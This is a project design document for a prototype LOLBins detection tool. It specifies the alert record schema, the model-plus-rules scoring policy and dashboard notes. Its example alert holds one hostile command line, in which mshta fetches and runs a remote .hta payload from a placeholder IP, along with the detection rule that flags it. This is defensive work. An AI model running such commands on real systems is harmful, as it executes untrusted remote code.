# Alert Record Schema and `score_event` Contract

**Owner:** Saif Abed (Data & ML)
**Consumers:** Hamdan Al Sabahi (Integration & quality) and Abdalrahman Ibrahim (Dashboard/UI)
**Status:** Ready for dashboard/API wiring

This is the shared `score_event(row) -> alert` contract listed in `docs/issues.md`.
It wraps the frozen evidence sources into one interpretable alert record. It does
**not** retrain, refit, or change any threshold.

- Module: `src/alert_scoring.py`
- Entry points: `score_event(...)`, `score_dataframe(...)`, `AlertScorer`
- CLI: `python src/alert_scoring.py --help`
- Sample output: `results/sample_alerts.json`, `results/sample_alerts.csv`
- Real-telemetry sample: `results/vm_alerts.json`, `results/vm_alerts.csv`

## 1. How to call it

### Single event (what the API endpoint wraps)

```python
from src.alert_scoring import score_event

alert = score_event(row)              # row has the 57 model-input columns
alert = score_event(row, xgb_proba=p) # already-scored events: pass the probability
```

`score_event` returns a plain `dict` with exactly the keys in
`src.alert_scoring.ALERT_FIELDS`. It is JSON-serialisable.

Hamdan's endpoint (illustrative, not implemented here):

```python
from fastapi import FastAPI
from src.alert_scoring import score_event

app = FastAPI()

@app.post("/score")
def score(payload: dict):
    return score_event(payload)
```

### Batch / offline

```python
from src.alert_scoring import score_dataframe

alerts = score_dataframe(df, proba_col="proba", label_col="true", per_outcome=8)
```

```powershell
# balanced demo sample from saved test outcomes
python src/alert_scoring.py --input results/test_event_outcomes.csv `
    --proba-col proba --label-col true --per-outcome 8 --prefix sample_alerts

# score the real adapted VM telemetry with the frozen XGBoost model
python src/alert_scoring.py --input data/processed/vm_adapted.parquet --prefix vm_alerts
```

## 2. Field contract

| Field | Type | Meaning |
|---|---|---|
| `event_id` | string | Stable per-event id (`record_id` when present) |
| `record_id` | string | Dataset/VM record id (may be empty) |
| `scenario_id` | string \| null | VM scenario id when available |
| `scored_at` | ISO-8601 string | UTC time the record was produced |
| `process_name` | string | Child image basename, lowercased |
| `parent_process` | string | Parent image basename, lowercased |
| `command_line` | string | Raw command line |
| `user` | string \| null | User context when available |
| `xgb_proba` | float | Frozen XGBoost probability |
| `xgb_pred` | 0/1 | `xgb_proba >= threshold` |
| `encoder_proba` | float \| null | SecureBERT probability if supplied |
| `model_proba` | float | Decision probability (XGB, or fusion if encoder supplied) |
| `model_pred` | 0/1 | `model_proba >= model_threshold` |
| `model_threshold` | float | Frozen threshold used (0.55 for XGB) |
| `rule_matched` | bool | Any deterministic rule matched |
| `rule_ids` | list[str] | Matched rule IDs, e.g. `["RULE-MSHTA-001"]` |
| `rule_reasons` | list[str] | Human-readable reasons per matched rule |
| `rule_attack_ids` | list[str] | ATT&CK IDs from matched rules |
| `rule_severity_max` | string \| null | `low` / `medium` / `high` / `critical` |
| `attack_techniques` | list[str] | ATT&CK suggestions (rules only, deduped) |
| `hybrid_score` | 0/1 | Final fusion decision (see policy below) |
| `decision` | string | `malicious` or `benign` (alias of `hybrid_score`) |
| `risk` | string | Triage band: `low` / `medium` / `high` |
| `risk_score` | int 0–100 | Auxiliary ordering score |
| `review_required` | bool | Arms disagree, or parent context missing |
| `evidence` | list[str] | Short explainable evidence lines |
| `model_version` | object | Function, checkpoint, threshold, rule engine |
| `scoring_policy` | string | `model_or_high_severity_rule` |
| `disclaimer` | string | Prototype/no-real-world-claim note |

## 3. Decision and risk policy (frozen)

- **Model arm:** XGBoost at `results/chosen_threshold.json` = **0.55**.
  If `encoder_proba` is supplied, the validation-selected fusion in
  `results/fusion_config.json` (`w_xgb=0.4`, threshold 0.50) is used instead.
- **Rules arm:** deterministic E1 engine in `rules/` (no tuning on VM data).
- **Hybrid decision:** `model_pred OR rule_severity_max in {high, critical}`.
  This matches the VM external check (`src/score_vm.py`).
- **Risk band:**
  - `low` when the hybrid decision is 0
  - `high` when hybrid is 1 **and** (`model_proba >= 0.85` or a high/critical rule matched)
  - `medium` otherwise (hybrid 1, moderate model evidence)
- **`review_required`:** true when the model and rule arms disagree, or when the
  parent process is unavailable. This is the analyst-review path.

Rules are evidence, **not** ground truth. Labels, `technique_expected`, and
scenario ground truth are never read as features and never appear in the record.

## 4. Example record

```json
{
  "event_id": "vm_9073f71e3991652f",
  "record_id": "vm_9073f71e3991652f",
  "scenario_id": "BEN-001",
  "scored_at": "2026-11-08T15:26:42+00:00",
  "process_name": "mshta.exe",
  "parent_process": "explorer.exe",
  "command_line": "mshta.exe http://198.51.100.7/payload.hta",
  "user": null,
  "xgb_proba": 0.971665,
  "xgb_pred": 1,
  "encoder_proba": null,
  "model_proba": 0.971665,
  "model_pred": 1,
  "model_threshold": 0.55,
  "rule_matched": true,
  "rule_ids": ["RULE-MSHTA-001"],
  "rule_reasons": ["mshta launched a script, a local .hta, or hosted content"],
  "rule_attack_ids": ["T1218.005"],
  "rule_severity_max": "high",
  "attack_techniques": ["T1218.005"],
  "hybrid_score": 1,
  "decision": "malicious",
  "risk": "high",
  "risk_score": 100,
  "review_required": false,
  "evidence": [
    "xgboost_baseline probability 0.972 (threshold 0.55) -> model_pred=1",
    "rule RULE-MSHTA-001: mshta launched a script, a local .hta, or hosted content",
    "rule severity_max=high",
    "context: mshta.exe <- explorer.exe"
  ],
  "model_version": {
    "function": "xgboost_baseline",
    "checkpoint": "xgboost_baseline",
    "threshold": 0.55,
    "rule_engine": "rules/ (deterministic Sigma-style)"
  },
  "scoring_policy": "model_or_high_severity_rule",
  "disclaimer": "Alert record from SentinelLOLBins. Risk is a triage priority, not a verdict of compromise. Rules are evidence, not ground truth. Prototype only; not an EDR replacement and not validated for enterprise deployment."
}
```

## 5. UI notes for Abdalrahman

- Show `risk` as the triage badge and `decision` separately so "high risk but
  not flagged" and "flagged at medium risk" are not conflated.
- Filters that map directly to fields: `risk`, `decision`, `scenario_id`,
  `rule_ids`, `attack_techniques`, free text over `command_line` / `evidence`.
- Detail view: `command_line`, `parent_process`, `evidence`, `rule_reasons`,
  `xgb_proba`, `rule_severity_max`, `attack_techniques`, `review_required`.
- Highlight `review_required` rows as the analyst-review queue.
- `results/sample_alerts.csv` / `.json` are safe demo inputs; the companion
  `results/sample_alerts_meta.csv` carries `expected_label` and TP/FP/FN/TN for
  demo annotation only — never load it into scoring.

## 6. Limitations

- The VM sample is one isolated, snapshot-backed VM and only the scenarios that
  ran there. It is an external sanity check, not an enterprise estimate.
- 14 model-input columns are NaN for raw VM telemetry (see
  `docs/vm_missing_fields.txt`); the model tolerates them but calibration shifts.
- `attack_techniques` are rule-derived suggestions, not ground truth.
